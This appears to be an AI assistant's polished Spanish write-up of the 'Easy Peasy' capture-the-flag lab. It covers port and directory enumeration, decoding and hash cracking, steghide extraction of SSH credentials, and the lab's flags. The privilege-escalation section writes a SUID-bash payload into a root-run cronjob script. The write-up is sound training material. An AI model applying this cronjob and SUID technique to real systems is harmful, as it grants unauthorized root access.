Aquí tienes tu write-up corregido, manteniendo tu estilo pero **bien justificado y técnicamente limpio**:

---

# Write-up Easy Peasy

## Recon

### Enumeración de puertos y servicios

Primero realizo un escaneo rápido para descubrir puertos abiertos:

```
nmap -T4 IP
```

Después, un escaneo completo para identificar servicios, versiones y posibles vectores:

```
nmap -sC -sV -O -p- -T4 IP
```

Puertos encontrados:

* 80/tcp → HTTP (nginx 1.16.1)
* 6498/tcp → SSH (OpenSSH)
* 65524/tcp → HTTP (Apache 2.4.43)

Esto indica que hay **dos aplicaciones web** a analizar:

* `http://IP` (nginx)
* `http://IP:65524` (Apache)

---

## Enumeración web

### Puerto 80 (nginx)

Fuzzing de directorios:

```
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Se descubren:

* `/robots`
* `/hidden`

Aunque aparece `/robots`, compruebo también el archivo estándar:

```
/robots.txt
```

---

### Directorio `/hidden`

Nuevo fuzzing:

```
gobuster dir -u http://IP/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Resultado:

* `/hidden/whatever`

Al inspeccionar el HTML (`Ctrl + U`), encuentro:

```
ZmxhZ3tmMXJzN19mbDRnfQ==
```

La cadena termina en `=`, patrón típico de **Base64**, por lo que la decodifico:

→ `flag{f1rs7_fl4g}`

---

## Puerto 65524 (Apache)

### robots.txt

```
http://IP:65524/robots.txt
```

Contenido relevante:

```
User-Agent: a18672860d0510e5ab6699730763b250
```

La cadena tiene **32 caracteres hexadecimales**, lo que coincide con un **hash MD5**.

Se puede atacar con:

```
hashcat -m 0 hash.txt rockyou.txt
```

O lookup online.

Resultado:

→ `flag{1m_s3c0nd_fl4g}`

---

### Página principal

Inspeccionando el código fuente:

```
ObsJmP173N2X6dOrAgEAL0Vu
```

Cadena alfanumérica sin patrón claro → pruebo encodings comunes (Base64, Base32, Base62) en CyberChef.

Base62 devuelve:

```
/n0th1ng3ls3m4tt3r
```

---

### Endpoint `/n0th1ng3ls3m4tt3r`

En el HTML:

* Imagen: `binarycodepixabay.jpg`
* Hash:

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

Tiene **64 caracteres hex**, lo que corresponde a **SHA-256**.

Se resuelve mediante lookup:

→ `mypasswordforthatjob`

---

## Esteganografía

Descargo la imagen y pruebo esteganografía:

```
steghide --extract -sf binarycodepixabay.jpg
```

Uso como contraseña:

```
mypasswordforthatjob
```

Funciona → extrae un fichero.

Contenido:

* Usuario: `boring`
* Password en binario

Convierto el binario a ASCII:

→ `iconvertedmypasswordtobinary`

---

## Credenciales obtenidas

```
user: boring
pass: iconvertedmypasswordtobinary
```

---

## Explotación

Conexión SSH:

```
ssh boring@IP -p 6498
```

Acceso conseguido.

---

## Flags usuario

```
cat user.txt
```

Contenido:

```
synt{a0jvgf33zfa0ez4y}
```

Formato típico de **ROT13**, lo decodifico:

→ `flag{n0wits33msn0rm4l}`

---

## Escalada de privilegios

### Enumeración

Tras revisar manualmente, detecto un **cronjob ejecutado como root**:

* Script: `/var/www/.mysecretcronjob.sh`
* Permisos: escribible por el usuario

Esto es crítico porque:

> Un script ejecutado por root y modificable por un usuario permite ejecutar código arbitrario con privilegios elevados.

---

### Explotación

Inyecto payload:

```
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /var/www/.mysecretcronjob.sh
```

Explicación:

* Copio `/bin/bash` a `/tmp`
* Aplico **SUID bit** → ejecuta como root

Espero a que el cronjob se ejecute (~1 min)

---

### Verificación

```
ls -l /tmp/rootbash
```

Debe aparecer:

```
-rwsr-xr-x
```

---

### Escalada

```
/tmp/rootbash -p
```

El flag `-p` mantiene privilegios efectivos.

→ Shell como root

---

## Root

```
cat /root/root.txt
```

→ `flag{63a9f0ea7bb98050796b649e85481845}`

---

## Resumen técnico rápido

* Enumeración: Nmap + Gobuster
* Web:

  * Base64
  * MD5 (hash)
  * Base62
  * SHA-256 (hash)
* Stego: steghide
* Acceso: SSH
* PrivEsc: cronjob + SUID bash

---

Si quieres, el siguiente nivel sería:

* adaptarlo a formato **portfolio (ATS + recruiter friendly)**
* o mapearlo a **MITRE ATT&CK** para que destaque más en tu CV.
